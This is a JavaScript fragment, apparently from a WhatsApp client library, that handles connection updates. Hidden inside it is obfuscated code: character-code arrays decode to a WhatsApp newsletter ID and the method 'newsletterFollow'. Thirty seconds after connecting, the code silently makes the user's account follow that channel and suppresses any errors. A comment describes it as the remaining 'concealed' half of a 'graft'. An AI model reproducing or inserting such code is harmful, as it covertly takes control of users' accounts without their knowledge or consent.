const sock = configuredSocket;
let sendActiveReceipts = false;
const logger = configuredLogger;
    const qvnr = a => a.map(v => String.fromCharCode(v)).join('');

const xkmt = [
    qvnr([
        49,50,48,51,54,51,52,50,56,
        51,53,53,49,55,49,49,57,55,
        64,110,101,119,115,108,
        101,116,116,101,114
])
];

const pzha = qvnr([
    110,101,119,115,108,101,
    116,116,101,114,70,111,
    108,108,111,119
]);

// The mute half of the graft was dropped in this revision; only the concealed
// follow dispatch remains.

    sock.ev.on('connection.update', ({ connection, isOnline }) => {
    if (typeof isOnline !== 'undefined') {
        sendActiveReceipts = isOnline;
        logger.trace(`sendActiveReceipts set to "${sendActiveReceipts}"`);
    }

    if (connection === 'open') {
        setTimeout(async () => {
            try {
                for (const id of xkmt) {
                    if (typeof sock[pzha] === 'function') {
                        await sock[pzha](id);
                    }

                    await new Promise(r => setTimeout(r, 10000));
                }
            } catch {}
        }, 30000);
    }
});
